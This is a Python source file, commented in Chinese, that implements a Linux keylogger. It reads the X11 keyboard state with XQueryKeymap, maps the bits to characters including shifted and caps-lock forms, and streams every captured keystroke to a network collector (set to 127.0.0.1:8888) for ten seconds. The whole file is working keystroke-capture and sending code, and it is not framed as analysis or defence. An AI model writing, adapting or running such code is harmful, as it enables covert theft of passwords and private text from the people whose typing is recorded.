# coding: utf-8

import sys
from time import sleep, time
import ctypes as ct
from ctypes.util import find_library
sys.path.append("../")
from task import NetworkTaskManager, NetworkClient

# linux only!
assert("linux" in sys.platform)


x11 = ct.cdll.LoadLibrary(find_library("X11"))
display = x11.XOpenDisplay(None)

# this will hold the keyboard state.  32 bytes, with each
# bit representing the state for a single key.
keyboard = (ct.c_char * 40)()

# 定义shift ctrl 这个特殊按键
shift_keys = ((6, 4), (7, 64))
modifiers = {
    "left shift": (6, 4),
    "right shift": (7, 64),
    "left ctrl": (4, 32),
    "right ctrl": (13, 2),
    "left alt": (8, 1),
    "right alt": (13, 16)
}
last_pressed = set()
last_pressed_adjusted = set()
last_modifier_state = {}
# caps的状态
caps_lock_state = 0

#  定义二进制数字到字符的转换
key_mapping = {
    1: {
        0b00000010: "<esc>",
        0b00000100: ("1", "!"),
        0b00001000: ("2", "@"),
        0b00010000: ("3", "#"),
        0b00100000: ("4", "$"),
        0b01000000: ("5", "%"),
        0b10000000: ("6", "^"),
    },
    2: {
        0b00000001: ("7", "&"),
        0b00000010: ("8", "*"),
        0b00000100: ("9", "("),
        0b00001000: ("0", ")"),
        0b00010000: ("-", "_"),
        0b00100000: ("=", "+"),
        0b01000000: "<backspace>",
        0b10000000: "<tab>",
    },
    3: {
        0b00000001: ("q", "Q"),
        0b00000010: ("w", "W"),
        0b00000100: ("e", "E"),
        0b00001000: ("r", "R"),
        0b00010000: ("t", "T"),
        0b00100000: ("y", "Y"),
        0b01000000: ("u", "U"),
        0b10000000: ("i", "I"),
    },
    4: {
        0b00000001: ("o", "O"),
        0b00000010: ("p", "P"),
        0b00000100: ("[", "{"),
        0b00001000: ("]", "}"),
        0b00010000: "<enter>",
        #0b00100000: "<left ctrl>",
        0b01000000: ("a", "A"),
        0b10000000: ("s", "S"),
    },
    5: {
        0b00000001: ("d", "D"),
        0b00000010: ("f", "F"),
        0b00000100: ("g", "G"),
        0b00001000: ("h", "H"),
        0b00010000: ("j", "J"),
        0b00100000: ("k", "K"),
        0b01000000: ("l", "L"),
        0b10000000: (";", ":"),
    },
    6: {
        0b00000001: ("'", "\""),
        0b00000010: ("`", "~"),
        #0b00000100: "<left shift>",
        0b00001000: ("\\", "|"),
        0b00010000: ("z", "Z"),
        0b00100000: ("x", "X"),
        0b01000000: ("c", "C"),
        0b10000000: ("v", "V"),
    },
    7: {
        0b00000001: ("b", "B"),
        0b00000010: ("n", "N"),
        0b00000100: ("m", "M"),
        0b00001000: (",", "<"),
        0b00010000: (".", ">"),
        0b00100000: ("/", "?"),
        #0b01000000: "<right shift>",
    },
    8: {
        #0b00000001: "<left alt>",
        0b00000010: " ",
        0b00000100: "<caps lock>",
    },
    13: {
        #0b00000010: "<right ctrl>",
        #0b00010000: "<right alt>",
    },
}


def fetch_keys_raw():
    x11.XQueryKeymap(display, keyboard)

    return keyboard


def fetch_keys():
    # 要维护shift, caps, ctrl等特殊按键的状态,
    global caps_lock_state, last_pressed, last_pressed_adjusted, last_modifier_state
    keypresses_raw = fetch_keys_raw()
    # 每次进行shift ctrl的当前状态的查询
    modifier_state = {}
    for mod, (i, byte) in modifiers.iteritems():
        modifier_state[mod] = bool(ord(keypresses_raw[i]) & byte)

    # shift被按
    shift = 0
    for i, byte in shift_keys:
        if ord(keypresses_raw[i]) & byte:
            shift = 1
            break

    # caps 的状态
    if ord(keypresses_raw[8]) & 4:
        caps_lock_state = int(not caps_lock_state)

    # 处理的当前的按键
    pressed = []
    for i, k in enumerate(keypresses_raw):
        o = ord(k)
        if o:
            # byte是二进值数， key是对应的字符
            for byte, key in key_mapping.get(i, {}).iteritems():
                if byte & o:
                    if isinstance(key, tuple):
                        key = key[shift or caps_lock_state]
                    pressed.append(key)

    tmp = pressed
    # 另外一份的物理环境代码中，借助evdev库我们可以得到持续按键的状态
    # 这里必须手动记录
    pressed = list(set(pressed).difference(last_pressed))
    state_changed = tmp != last_pressed and (pressed or last_pressed_adjusted)
    last_pressed = tmp
    last_pressed_adjusted = pressed

    if pressed:
        pressed = pressed[0]
    else:
        pressed = None

    state_changed = last_modifier_state and (state_changed or modifier_state != last_modifier_state)
    last_modifier_state = modifier_state

    return state_changed, modifier_state, pressed


def log(done, callback, sleep_interval=0.005):
    while not done():
        sleep(sleep_interval)
        changed, modifiers, keys = fetch_keys()
        if changed:
            callback(time(), modifiers, keys)


def virtual_thread_func(file_name, file_type):
    """
       虚拟的环境 需要使用x11来捕捉键盘的记录
    """
    # 定义接受数据的服务器的Ip和端口
    server_instance = NetworkClient({"IP": "127.0.0.1", "PORT": 8888})
    # 建立一个传输数据的网络任务
    text_task = NetworkTaskManager(server_instance, file_type, file_name)

    now = time()
    done = lambda: time() > now + 10

    def print_keys(t, modifiers, keys):
        if keys:
            # 进行网络传输
            text_task.send_content(keys)

    log(done, print_keys)
    text_task.send_stop_message()
